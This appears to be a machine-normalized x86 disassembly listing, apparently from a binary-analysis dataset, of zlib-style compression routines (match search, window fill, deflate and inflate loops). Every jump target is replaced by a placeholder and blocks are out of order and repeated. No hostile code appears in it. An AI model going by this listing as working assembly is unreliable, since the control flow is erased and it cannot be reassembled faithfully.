mov [ esp + 0xc ] ebx
mov edx [ eax + 0x3c ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x30 ]
mov [ esp + 0x14 ] edx
mov edx [ eax + 0x34 ]
mov bl [ ecx + edi - 0x1 ]
add edx [ eax + 0x68 ]
mov [ esp + 0x18 ] bl
mov bl [ ecx + edi ]
add edx 0x102
mov [ esp + 0x19 ] bl
mov ebx [ eax + 0x74 ]
cmp ebx [ eax + 0x88 ]
jb r-xdata
mov esi [ eax + 0x34 ]
add esi [ esp ]
mov bl [ esi + edi ]
cmp bl [ esp + 0x19 ]
jne r-xdata
mov [ esp + 0x8 ] ebx
mov ebx [ esp ]
and ebx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
movzx ebx [ esi + ebx * 2 ]
mov [ esp ] ebx
cmp ebx [ esp + 0xc ]
jbe r-xdata
mov bl [ esi + edi - 0x1 ]
cmp bl [ esp + 0x18 ]
jne r-xdata
mov edx [ eax + 0x70 ]
mov ecx edi
cmp edx ecx
jb r-xdata
dec [ esp + 0x4 ]
jne r-xdata
mov bl [ esi ]
cmp bl [ ecx ]
jne r-xdata
mov eax edx
mov eax ecx
jmp r-xdata
inc esi
mov bl [ esi ]
cmp bl [ ecx + 0x1 ]
jne r-xdata
add esp 0x1c
pop edi
pop esi
pop ebx
retn
add ecx 0x2
inc esi
mov ebx edx
sub ebx ecx
push ebx
mov ebx 0x102
pop ecx
sub ebx ecx
lea ecx [ edx - 0x102 ]
cmp edi ebx
jge r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
mov esi [ esp ]
mov [ eax + 0x6c ] esi
mov edi ebx
cmp ebx [ esp + 0x8 ]
jge r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
mov bl [ ecx + edi - 0x1 ]
mov [ esp + 0x18 ] bl
mov bl [ ecx + edi ]
mov [ esp + 0x19 ] bl
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
cmp edx ecx
ja r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
sub_4689c0
push ebx
push esi
push edi
mov ebx [ eax + 0x34 ]
mov esi [ eax + 0x34 ]
add ebx [ eax + 0x68 ]
add esi edx
mov ecx ebx
mov edi ebx
mov bl [ esi ]
add edi 0x102
cmp bl [ ecx ]
jne r-xdata
mov eax 0x2
jmp r-xdata
mov bl [ esi + 0x1 ]
cmp bl [ ecx + 0x1 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
add ecx 0x2
add esi 0x2
sub edi ecx
mov ecx 0x102
sub ecx edi
cmp ecx 0x3
jge r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
mov [ eax + 0x6c ] edx
mov edx [ eax + 0x70 ]
cmp edx ecx
jae r-xdata
mov eax 0x2
jmp r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
mov eax ecx
mov ecx [ eax + 0x70 ]
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
cmp edi ecx
ja r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
sub_468a60
push ebx
push esi
push edi
mov ebx eax
push ebp
push ecx
mov esi [ ebx + 0x28 ]
mov eax [ ebx + 0x28 ]
sub eax 0x106
add eax esi
cmp eax [ ebx + 0x68 ]
ja r-xdata
mov ebp [ ebx ]
cmp [ ebp + 0x4 ] 0x0
je r-xdata
push esi
mov eax [ ebx + 0x34 ]
mov edx eax
mov ebp esi
add edx ebp
push edx
push eax
call sub_4676d0
add esp 0xc
sub [ ebx + 0x6c ] esi
sub [ ebx + 0x68 ] esi
sub [ ebx + 0x58 ] ebp
mov eax [ ebx + 0x48 ]
mov edx eax
add edx edx
add edx [ ebx + 0x40 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
mov ecx edi
add edx [ ebx + 0x68 ]
mov eax ebp
add edx [ ebx + 0x70 ]
call sub_468750
add [ ebx + 0x70 ] eax
cmp [ ebx + 0x70 ] 0x3
jb r-xdata
xor ecx ecx
mov cx [ esp ]
sub cx si
jmp r-xdata
cmp [ ebx + 0x70 ] 0x106
jae r-xdata
mov eax [ ebx + 0x34 ]
mov edx [ ebx + 0x68 ]
movzx eax [ eax + edx ]
mov [ ebx + 0x44 ] eax
mov ecx [ ebx + 0x54 ]
shl eax cl
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x68 ]
movzx edx [ edx + ecx + 0x1 ]
xor eax edx
and eax [ ebx + 0x50 ]
mov [ ebx + 0x44 ] eax
sub edx 0x2
movzx ecx [ edx ]
mov [ esp ] ecx
cmp esi [ esp ]
ja r-xdata
mov eax esi
mov edx eax
add edx edx
add edx [ ebx + 0x3c ]
mov [ edx ] cx
dec eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor ecx ecx
mov cx [ esp ]
sub cx si
jmp r-xdata
mov edi [ ebx + 0x38 ]
sub edi [ ebx + 0x70 ]
sub edi [ ebx + 0x68 ]
jmp r-xdata
sub edx 0x2
movzx ecx [ edx ]
mov [ esp ] ecx
cmp esi [ esp ]
ja r-xdata
add edi esi
mov [ edx ] cx
dec eax
jne r-xdata
sub_468a75
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
sub eax 0x106
add eax esi
cmp eax [ ebx + 0x68 ]
ja r-xdata
dec edi
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
mov ebp [ ebx ]
cmp [ ebp + 0x4 ] 0x0
je r-xdata
push esi
mov eax [ ebx + 0x34 ]
mov edx eax
mov ebp esi
add edx ebp
push edx
push eax
call sub_4676d0
add esp 0xc
sub [ ebx + 0x6c ] esi
sub [ ebx + 0x68 ] esi
sub [ ebx + 0x58 ] ebp
mov eax [ ebx + 0x48 ]
mov edx eax
add edx edx
add edx [ ebx + 0x40 ]
mov edi esi
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
mov ecx edi
add edx [ ebx + 0x68 ]
mov eax ebp
add edx [ ebx + 0x70 ]
call sub_468750
add [ ebx + 0x70 ] eax
cmp [ ebx + 0x70 ] 0x3
jb r-xdata
xor ecx ecx
mov cx [ esp ]
sub cx si
jmp r-xdata
cmp [ ebx + 0x70 ] 0x106
jae r-xdata
mov eax [ ebx + 0x34 ]
mov edx [ ebx + 0x68 ]
movzx eax [ eax + edx ]
mov [ ebx + 0x44 ] eax
mov ecx [ ebx + 0x54 ]
shl eax cl
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x68 ]
movzx edx [ edx + ecx + 0x1 ]
xor eax edx
and eax [ ebx + 0x50 ]
mov [ ebx + 0x44 ] eax
sub edx 0x2
movzx ecx [ edx ]
mov [ esp ] ecx
cmp esi [ esp ]
ja r-xdata
mov eax esi
mov edx eax
add edx edx
add edx [ ebx + 0x3c ]
mov [ edx ] cx
dec eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor ecx ecx
mov cx [ esp ]
sub cx si
jmp r-xdata
mov edi [ ebx + 0x38 ]
sub edi [ ebx + 0x70 ]
sub edi [ ebx + 0x68 ]
jmp r-xdata
sub edx 0x2
movzx ecx [ edx ]
mov [ esp ] ecx
cmp esi [ esp ]
ja r-xdata
add edi esi
mov [ edx ] cx
dec eax
jne r-xdata
sub_468b74
push ebx
mov ebx eax
push esi
push ecx
mov [ esp ] edx
mov esi 0xffff
mov eax [ ebx + 0xc ]
sub eax 0x5
cmp esi eax
jbe r-xdata
cmp [ ebx + 0x70 ] 0x1
ja r-xdata
mov esi eax
mov edx [ ebx + 0x70 ]
xor ecx ecx
add [ ebx + 0x68 ] edx
mov [ ebx + 0x70 ] ecx
mov eax [ ebx + 0x58 ]
mov edx [ ebx + 0x68 ]
add eax esi
test edx edx
je r-xdata
mov eax ebx
call sub_468a60
mov eax [ ebx + 0x70 ]
test eax eax
jne r-xdata
sub edx eax
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x68 ] eax
push 0x0
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
cmp [ ebx + 0x58 ] 0x0
jl r-xdata
cmp eax edx
ja r-xdata
test eax eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x58 ]
sub edx eax
mov ecx [ ebx + 0x28 ]
sub ecx 0x106
cmp edx ecx
jb r-xdata
cmp [ esp ] 0x4
sete dl
and edx 0x1
push edx
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
cmp [ ebx + 0x58 ] 0x0
jl r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
push 0x0
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
test eax eax
jl r-xdata
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
cmp [ esp ] 0x4
jne r-xdata
cmp [ esp ] 0x4
jne r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax 0x1
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
sub_468cd0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
xor esi esi
cmp [ ebx + 0x70 ] 0x3
jb r-xdata
mov eax ebx
call sub_468a60
mov eax [ ebx + 0x70 ]
cmp eax 0x106
jae r-xdata
test esi esi
je r-xdata
mov ecx [ ebx + 0x54 ]
mov eax [ ebx + 0x44 ]
shl eax cl
mov ecx [ ebx + 0x68 ]
mov edx [ ebx + 0x34 ]
movzx edx [ edx + ecx + 0x2 ]
xor eax edx
and eax [ ebx + 0x50 ]
mov [ ebx + 0x44 ] eax
mov ecx [ ebx + 0x40 ]
mov edx [ ebx + 0x68 ]
and edx [ ebx + 0x30 ]
mov ax [ ecx + eax * 2 ]
mov ecx [ ebx + 0x3c ]
movzx esi ax
mov [ ecx + edx * 2 ] ax
mov cx [ ebx + 0x68 ]
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x5c ] 0x3
jb r-xdata
mov eax [ ebx + 0x68 ]
mov edx [ ebx + 0x28 ]
sub edx 0x106
sub eax esi
cmp eax edx
ja r-xdata
cmp [ esp ] 0x4
sete dl
and edx 0x1
push edx
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
cmp [ ebx + 0x58 ] 0x0
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x34 ]
mov edx [ ebx + 0x68 ]
mov al [ eax + edx ]
mov edx [ ebx + 0x16a0 ]
mov ecx [ ebx + 0x169c ]
mov [ edx + ecx * 2 ] 0x0
mov edx [ ebx + 0x169c ]
inc [ ebx + 0x169c ]
mov ecx [ ebx + 0x1694 ]
mov [ ecx + edx ] al
and eax 0xff
inc [ ebx + eax * 4 + 0x90 ]
mov eax [ ebx + 0x1698 ]
dec eax
cmp eax [ ebx + 0x169c ]
sete al
and eax 0x1
dec [ ebx + 0x70 ]
inc [ ebx + 0x68 ]
mov ax [ ebx + 0x68 ]
mov ecx [ ebx + 0x16a0 ]
sub ax [ ebx + 0x6c ]
mov edi [ ebx + 0x169c ]
mov dl [ ebx + 0x5c ]
mov [ ecx + edi * 2 ] ax
sub dl 0x3
mov ecx [ ebx + 0x169c ]
dec eax
inc [ ebx + 0x169c ]
mov edi [ ebx + 0x1694 ]
mov [ edi + ecx ] dl
and edx 0xff
xor ecx ecx
mov cl [ edx + rw-data ]
movzx edx ax
inc [ ebx + ecx * 4 + 0x494 ]
cmp edx 0x100
jge r-xdata
mov eax [ ebx + 0x84 ]
cmp eax 0x2
je r-xdata
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x70 ] 0x106
jae r-xdata
push 0x0
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
cmp [ ebx + 0x58 ] 0x0
jl r-xdata
movzx eax ax
sar eax 0x7
mov dl [ eax + rw-data ]
movzx ecx ax
mov dl [ ecx + rw-data ]
jmp r-xdata
cmp [ ebx + 0x84 ] 0x3
jne r-xdata
cmp eax 0x3
je r-xdata
cmp [ esp ] 0x4
jne r-xdata
cmp [ esp ] 0x4
jne r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
mov edx [ ebx + 0x5c ]
xor ecx ecx
add [ ebx + 0x68 ] edx
mov [ ebx + 0x5c ] ecx
mov ecx [ ebx + 0x68 ]
mov edx [ ebx + 0x34 ]
movzx edx [ edx + ecx ]
mov [ ebx + 0x44 ] edx
mov ecx [ ebx + 0x54 ]
mov edi [ ebx + 0x68 ]
shl edx cl
mov ecx [ ebx + 0x34 ]
movzx ecx [ ecx + edi + 0x1 ]
xor edx ecx
and edx [ ebx + 0x50 ]
mov [ ebx + 0x44 ] edx
jmp r-xdata
cmp [ ebx + 0x70 ] 0x3
jb r-xdata
xor eax eax
mov al dl
inc [ ebx + eax * 4 + 0x984 ]
mov ecx [ ebx + 0x1698 ]
dec ecx
cmp ecx [ ebx + 0x169c ]
sete al
and eax 0x1
mov edx [ ebx + 0x5c ]
sub [ ebx + 0x70 ] edx
mov ecx [ ebx + 0x5c ]
cmp ecx [ ebx + 0x7c ]
ja r-xdata
mov edx [ ebx + 0x68 ]
sub edx esi
cmp edx 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_468848
mov [ ebx + 0x5c ] eax
jmp r-xdata
mov eax 0x1
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
test eax eax
je r-xdata
dec [ ebx + 0x5c ]
mov edx esi
mov eax ebx
call sub_4689c0
mov [ ebx + 0x5c ] eax
inc [ ebx + 0x68 ]
mov ecx [ ebx + 0x54 ]
mov edx [ ebx + 0x44 ]
shl edx cl
mov ecx [ ebx + 0x34 ]
mov esi [ ebx + 0x68 ]
movzx ecx [ ecx + esi + 0x2 ]
xor edx ecx
and edx [ ebx + 0x50 ]
mov [ ebx + 0x44 ] edx
mov ecx [ ebx + 0x40 ]
mov dx [ ecx + edx * 2 ]
mov ecx [ ebx + 0x68 ]
and ecx [ ebx + 0x30 ]
mov esi [ ebx + 0x3c ]
mov [ esi + ecx * 2 ] dx
movzx esi dx
mov edx [ ebx + 0x40 ]
mov ecx [ ebx + 0x44 ]
mov di [ ebx + 0x68 ]
mov [ edx + ecx * 2 ] di
dec [ ebx + 0x5c ]
jne r-xdata
inc [ ebx + 0x68 ]
jmp r-xdata
sub_468fd8
push ebx
push esi
push edi
add esp 0xfffffff8
xor esi esi
mov ebx eax
mov [ esp ] edx
cmp [ ebx + 0x70 ] 0x3
jb r-xdata
mov eax ebx
call sub_468a60
mov eax [ ebx + 0x70 ]
cmp eax 0x106
jae r-xdata
mov eax [ ebx + 0x5c ]
mov [ ebx + 0x74 ] eax
mov edx [ ebx + 0x6c ]
mov [ ebx + 0x60 ] edx
mov [ ebx + 0x5c ] 0x2
test esi esi
je r-xdata
mov ecx [ ebx + 0x54 ]
mov eax [ ebx + 0x44 ]
shl eax cl
mov ecx [ ebx + 0x68 ]
mov edx [ ebx + 0x34 ]
movzx edx [ edx + ecx + 0x2 ]
xor eax edx
and eax [ ebx + 0x50 ]
mov [ ebx + 0x44 ] eax
mov ecx [ ebx + 0x40 ]
mov edx [ ebx + 0x68 ]
and edx [ ebx + 0x30 ]
mov ax [ ecx + eax * 2 ]
mov ecx [ ebx + 0x3c ]
movzx esi ax
mov [ ecx + edx * 2 ] ax
mov cx [ ebx + 0x68 ]
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov eax [ ebx + 0x74 ]
cmp eax 0x3
jb r-xdata
mov ecx [ ebx + 0x74 ]
cmp ecx [ ebx + 0x7c ]
jae r-xdata
cmp [ ebx + 0x64 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x64 ] 0x0
je r-xdata
cmp eax [ ebx + 0x5c ]
jb r-xdata
mov eax [ ebx + 0x68 ]
mov edx [ ebx + 0x28 ]
sub edx 0x106
sub eax esi
cmp eax edx
ja r-xdata
cmp [ esp ] 0x4
sete al
and eax 0x1
push eax
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
cmp [ ebx + 0x58 ] 0x0
jl r-xdata
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x68 ]
mov al [ edx + ecx - 0x1 ]
mov edx [ ebx + 0x16a0 ]
mov ecx [ ebx + 0x169c ]
mov [ edx + ecx * 2 ] 0x0
mov edx [ ebx + 0x169c ]
inc [ ebx + 0x169c ]
mov ecx [ ebx + 0x1694 ]
mov [ ecx + edx ] al
and eax 0xff
inc [ ebx + eax * 4 + 0x90 ]
mov eax [ ebx + 0x1698 ]
dec eax
cmp eax [ ebx + 0x169c ]
sete dl
and edx 0x1
xor ecx ecx
mov [ ebx + 0x64 ] ecx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x64 ] 0x1
inc [ ebx + 0x68 ]
dec [ ebx + 0x70 ]
jmp r-xdata
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x68 ]
mov al [ edx + ecx - 0x1 ]
mov edx [ ebx + 0x16a0 ]
mov ecx [ ebx + 0x169c ]
mov [ edx + ecx * 2 ] 0x0
mov edx [ ebx + 0x169c ]
inc [ ebx + 0x169c ]
mov ecx [ ebx + 0x1694 ]
mov [ ecx + edx ] al
and eax 0xff
inc [ ebx + eax * 4 + 0x90 ]
mov eax [ ebx + 0x1698 ]
dec eax
cmp eax [ ebx + 0x169c ]
sete al
and eax 0x1
test eax eax
je r-xdata
mov edx [ ebx + 0x68 ]
add edx [ ebx + 0x70 ]
sub edx 0x3
mov [ esp + 0x4 ] edx
mov ax [ ebx + 0x68 ]
mov ecx [ ebx + 0x16a0 ]
dec eax
mov edi [ ebx + 0x169c ]
sub ax [ ebx + 0x60 ]
mov dl [ ebx + 0x74 ]
mov [ ecx + edi * 2 ] ax
sub dl 0x3
mov ecx [ ebx + 0x169c ]
dec eax
inc [ ebx + 0x169c ]
mov edi [ ebx + 0x1694 ]
mov [ edi + ecx ] dl
and edx 0xff
xor ecx ecx
mov cl [ edx + rw-data ]
movzx edx ax
inc [ ebx + ecx * 4 + 0x494 ]
cmp edx 0x100
jge r-xdata
mov eax [ ebx + 0x84 ]
cmp eax 0x2
je r-xdata
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
cmp [ ebx + 0x70 ] 0x106
jae r-xdata
inc [ ebx + 0x68 ]
dec [ ebx + 0x70 ]
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
push 0x0
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
cmp [ ebx + 0x58 ] 0x0
jl r-xdata
movzx eax ax
sar eax 0x7
mov dl [ eax + rw-data ]
movzx ecx ax
mov dl [ ecx + rw-data ]
jmp r-xdata
cmp [ ebx + 0x84 ] 0x3
jne r-xdata
cmp eax 0x3
je r-xdata
cmp [ esp ] 0x4
jne r-xdata
cmp [ esp ] 0x4
jne r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
dec [ ebx + 0x74 ]
jne r-xdata
mov ecx [ ebx + 0x54 ]
mov esi [ ebx + 0x44 ]
shl esi cl
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x68 ]
movzx edx [ edx + ecx + 0x2 ]
xor esi edx
and esi [ ebx + 0x50 ]
mov [ ebx + 0x44 ] esi
mov ecx [ ebx + 0x40 ]
mov dx [ ecx + esi * 2 ]
mov ecx [ ebx + 0x68 ]
and ecx [ ebx + 0x30 ]
mov esi [ ebx + 0x3c ]
mov [ esi + ecx * 2 ] dx
movzx ecx dx
mov esi ecx
mov edx [ ebx + 0x40 ]
mov ecx [ ebx + 0x44 ]
mov di [ ebx + 0x68 ]
mov [ edx + ecx * 2 ] di
xor eax eax
mov al dl
inc [ ebx + eax * 4 + 0x984 ]
mov ecx [ ebx + 0x1698 ]
dec ecx
cmp ecx [ ebx + 0x169c ]
sete al
and eax 0x1
mov edx [ ebx + 0x74 ]
dec edx
sub [ ebx + 0x70 ] edx
sub [ ebx + 0x74 ] 0x2
cmp [ ebx + 0x5c ] 0x5
ja r-xdata
mov edx [ ebx + 0x68 ]
sub edx esi
cmp edx 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_468848
mov [ ebx + 0x5c ] eax
jmp r-xdata
mov eax 0x1
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
inc [ ebx + 0x68 ]
mov ecx [ ebx + 0x68 ]
cmp ecx [ esp + 0x4 ]
ja r-xdata
xor edx edx
mov [ ebx + 0x64 ] edx
mov [ ebx + 0x5c ] 0x2
inc [ ebx + 0x68 ]
test eax eax
je r-xdata
cmp [ ebx + 0x84 ] 0x1
je r-xdata
mov edx esi
mov eax ebx
call sub_4689c0
mov [ ebx + 0x5c ] eax
push 0x0
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x58 ]
cmp [ ebx + 0x58 ] 0x0
jl r-xdata
mov [ ebx + 0x5c ] 0x2
cmp [ ebx + 0x5c ] 0x3
jne r-xdata
xor edx edx
mov edx [ ebx + 0x34 ]
add edx [ ebx + 0x58 ]
jmp r-xdata
mov ecx [ ebx + 0x68 ]
sub ecx [ ebx + 0x6c ]
cmp ecx 0x1000
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_46c6f8
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x58 ] ecx
mov eax [ ebx ]
call sub_4681ec
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_4693dc
push ebx
push esi
push edi
add esp 0xffffffbc
mov [ esp ] eax
mov eax [ esp ]
mov ecx [ eax + 0x1c ]
mov [ esp + 0x4 ] ecx
mov eax [ esp ]
mov ecx [ eax ]
dec ecx
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov ecx [ eax + 0x4 ]
sub ecx 0x5
add ecx [ esp + 0x8 ]
mov [ esp + 0xc ] ecx
mov eax [ esp ]
mov ebx [ eax + 0xc ]
mov eax [ esp ]
dec ebx
mov ecx ebx
mov eax [ eax + 0x10 ]
sub edx eax
sub eax 0x101
sub ecx edx
add eax ebx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x24 ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x28 ]
mov [ esp + 0x1c ] ecx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x2c ]
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x30 ]
mov [ esp + 0x24 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x34 ]
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x38 ]
mov [ esp + 0x2c ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x48 ]
mov [ esp + 0x30 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x4c ]
mov edx 0x1
mov [ esp + 0x34 ] ecx
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x50 ]
shl edx cl
dec edx
mov [ esp + 0x38 ] edx
mov edx 0x1
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x54 ]
shl edx cl
dec edx
mov [ esp + 0x3c ] edx
mov eax [ esp + 0x28 ]
and eax [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov ecx [ edx + eax * 4 ]
mov [ esp + 0x40 ] ecx
inc [ esp + 0x8 ]
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x8 ]
xor edx edx
mov dl [ eax ]
shl edx cl
add [ esp + 0x28 ] edx
add [ esp + 0x2c ] 0x8
inc [ esp + 0x8 ]
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x8 ]
xor edx edx
mov dl [ eax ]
shl edx cl
add [ esp + 0x28 ] edx
add [ esp + 0x2c ] 0x8
test esi 0x10
je r-xdata
inc ebx
mov al [ esp + 0x42 ]
mov [ ebx ] al
jmp r-xdata
test esi 0x40
jne r-xdata
movzx eax [ esp + 0x42 ]
and esi 0xf
test esi esi
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jae r-xdata
test esi 0x20
je r-xdata
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
and edx [ esp + 0x28 ]
movzx eax [ esp + 0x42 ]
add edx eax
mov ecx [ esp + 0x30 ]
mov edx [ ecx + edx * 4 ]
mov [ esp + 0x40 ] edx
jmp r-xdata
cmp [ esp + 0x2c ] 0xf
jae r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
mov eax [ esp + 0x2c ]
mov edx 0x1
shr eax 0x3
sub [ esp + 0x8 ] eax
shl eax 0x3
sub [ esp + 0x2c ] eax
mov ecx [ esp + 0x2c ]
shl edx cl
dec edx
lea ecx [ ebx + 0x1 ]
and [ esp + 0x28 ] edx
mov edx [ esp ]
mov eax [ esp + 0x8 ]
inc eax
mov [ edx ] eax
mov eax [ esp ]
mov [ eax + 0xc ] ecx
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0xc ]
jae r-xdata
cmp ebx [ esp + 0x14 ]
jb r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov ecx [ esp + 0x4 ]
mov [ ecx ] 0x12
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] 0x3
jmp r-xdata
movzx esi [ esp + 0x41 ]
mov ecx esi
shr [ esp + 0x28 ] cl
sub [ esp + 0x2c ] esi
movzx esi [ esp + 0x40 ]
test esi esi
jne r-xdata
mov ecx [ esp + 0x28 ]
and ecx [ esp + 0x3c ]
mov edx [ esp + 0x34 ]
mov ecx [ edx + ecx * 4 ]
mov [ esp + 0x40 ] ecx
inc [ esp + 0x8 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x8 ]
movzx edx [ edx ]
shl edx cl
add [ esp + 0x28 ] edx
add [ esp + 0x2c ] 0x8
inc [ esp + 0x8 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x8 ]
movzx edx [ edx ]
shl edx cl
add [ esp + 0x28 ] edx
add [ esp + 0x2c ] 0x8
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
